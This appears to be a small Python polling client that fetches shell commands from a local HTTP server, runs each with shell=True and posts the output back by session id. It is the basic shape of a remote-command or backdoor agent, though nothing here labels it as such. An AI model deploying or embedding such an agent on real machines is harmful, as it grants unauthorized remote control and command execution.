import subprocess
import requests
import time

def update_status(session_id, data):
    r = requests.post("http://127.0.0.1:8000/command_response/"+str(session_id), json = {"command_output":str(data)})
    print(r.json())

while True:
    r = requests.get("http://127.0.0.1:8000/get_all_commands")
    data = r.json()
    for session in data["sessions"]:
        try:
            output = subprocess.check_output(session["command"], shell=True, stderr=subprocess.STDOUT)
            update_status(session["session_id"],output.decode())
        except subprocess.CalledProcessError as e:
            update_status(session["session_id"],e.output.decode())
    time.sleep(20000)


